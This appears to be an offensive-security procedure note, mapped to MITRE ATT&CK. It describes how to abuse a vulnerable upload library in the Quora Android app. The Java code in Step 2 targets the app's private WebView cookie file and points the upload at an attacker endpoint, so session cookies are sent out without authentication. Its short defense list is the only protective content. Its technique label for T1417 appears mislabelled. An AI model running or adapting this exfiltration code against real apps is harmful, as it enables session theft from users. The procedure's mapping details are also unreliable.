---
id: proc-quora-craft-params
tags:
  - android
  - intent-crafting
  - file-upload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1417]]'
updated_at: '2025-12-14T17:24:42.674Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[T1417]]'
---
# Craft UploadTaskParameters for Arbitrary File

## Summary

This procedure creates UploadTaskParameters to specify an arbitrary file from the target app's private directory and a remote server URL, preparing for injection into a malicious intent.

## Description

Using the vulnerable UploadService library, parameters are set to target sensitive files like cookies in /data/data/com.quora.android/app_webview/Cookies. The ID is set for tracking, server URL to attacker endpoint, and file added via UploadFile constructor. This enables exfiltration without authentication.

## Requirements

1. Access to Android development environment (e.g., Android Studio)
2. Knowledge of target app's data paths (e.g., via adb shell ls /data/data/com.quora.android)
3. Attacker server ready to receive uploads

## Defense

Defensive measures and detection strategies:

- Validate all file paths and URLs in service parameters
- Enforce signature-based permission checks for intent extras
- Log and alert on uploads from unexpected paths

## Objectives

1. Configure task ID and server URL
2. Add target file from private directory
3. Ensure parameters are serializable for intent

## Instructions

### Step 1: Instantiate Parameters

**Context**: Create the base UploadTaskParameters object.

In Java code:

```java
UploadTaskParameters params = new UploadTaskParameters();
```

> This initializes the object for configuration.

### Step 2: Set Configuration

**Context**: Define ID, URL, and file.

```java
params.setId("1337");
params.setServerUrl("http://attacker.com/upload");
params.addFile(new UploadFile("/data/data/com.quora.android/app_webview/Cookies"));
```

> Replace URL with your endpoint; file path targets sensitive data.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] - Execution

### Techniques

- [[T1417]] - Hijack Execution Flow

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[android]]
- [[file-upload]]
